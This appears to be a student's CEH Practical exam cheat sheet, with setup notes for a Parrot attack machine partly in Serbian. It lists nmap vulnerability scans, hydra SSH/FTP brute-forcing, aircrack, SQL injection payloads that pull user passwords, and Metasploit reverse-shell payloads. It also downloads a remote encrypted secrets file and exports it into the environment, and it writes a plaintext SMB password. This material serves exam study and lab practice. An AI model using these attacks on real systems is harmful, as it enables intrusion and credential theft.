//Config Parrot-a


#1#


sgpt "Analiziraj ovaj nmap output i reci mi najbitnije nalaze" <<< "$(cat full_scan.txt)"

curl -fsSL https://raw.githubusercontent.com/stefanmilosavljevicns/cehpract/main/secret.txt.gpg -o /tmp/secret.txt.gpg && export $(gpg -d /tmp/secret.txt.gpg) && rm -f /tmp/secret.txt.gpg && mkdir -p ~/.config/shell_gpt && sed -i 's/^DEFAULT_MODEL=.*/DEFAULT_MODEL=gpt-4o-mini/' ~/.config/shell_gpt/.sgptrc 2>/dev/null || echo 'DEFAULT_MODEL=gpt-4o-mini' >> ~/.config/shell_gpt/.sgptrc

#2#


echo '"\e\177": backward-kill-word' >> ~/.inputrc && bind -f ~/.inputrc && echo '"\ed": kill-word' >> ~/.inputrc && bind -f ~/.inputrc && apt install -y cifs-utils

//Ako bude problema
smbclient -L //172.25.0.11 -U Admin

echo -e "username=Admin\npassword=Pa$$w0rd" | sudo tee /etc/smb-credentials >/dev/null && sudo chmod 600 /etc/smb-credentials

echo "//172.25.0.11/Users/Admin/Desktop/Share /home/attacker/Desktop/Share cifs credentials=/etc/smb-credentials,vers=3.0,uid=1000,gid=1000,iocharset=utf8,_netdev 0 0" | sudo tee -a /etc/fstab  && sudo mount -a && systemctl daemon-reload

________________________________________________________________
# 🛠 CEH Practical Cheat Sheet

# 🔍 NMAP
nmap -sS -sV -p- <IP> -oN results.txt
nmap -p- -A -O -sC -sV --script vuln -T4 <IP>
nmap -p 137,389,445 --script smb-os-discovery,ldap-rootdse,nbstat <IP>


# 🌐 GOBUSTER
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target -w common.txt -x php,txt,html
gobuster dir -u http://target -w common.txt -x zip,sql,txt


# 🔐 HYDRA
hydra -l admin -P rockyou.txt ssh://<IP>
hydra -l admin -P rockyou.txt ftp://<IP>


# 📡 AIRCRACK
aircrack-ng capture.pcap
aircrack-ng -w rockyou.txt capture.pcap


# 🔎 DNS
dnsrecon -d site.com -a

# 🧬 CRYPTO
Base64 (=) → CyberChef
32 hex → MD5 → John
40 hex → SHA1 → John
%xx → URL → CyberChef
Hex → CyberChef

# 💉 SQL INJECTION
' 
" 
`
' OR 1=1 --
admin' --
' AND 1=1 --
' AND 1=2 --
' UNION SELECT null,null --
' UNION SELECT database(),user() --
' UNION SELECT user,password FROM users --
' ORDER BY 1 --
' ORDER BY 2 --
' AND LENGTH(database())=4 --
' AND SUBSTRING(database(),1,1)='d' --

# 🦠 MALWARE (PE)
strings sample.exe
strings sample.exe | grep http
md5sum sample.exe

# 💣 METASPLOIT
msfconsole
search smb
use exploit/...
show payloads
set RHOSTS <IP>
set LHOST <IP>
run

linux/x86/meterpreter/reverse_tcp
windows/meterpreter/reverse_tcp
generic/shell_reverse_tcp

# 📂 FILE
file sample
strings sample

# 🧪 STEGO
steghide extract -sf file.jpg -p password

# 🔍 SEARCHSPLOIT
searchsploit apache

# 🎯 LOGIKA
web → gobuster
login → hydra / sqli
hash → john
exploit → metasploit
file → strings
wifi → aircrack

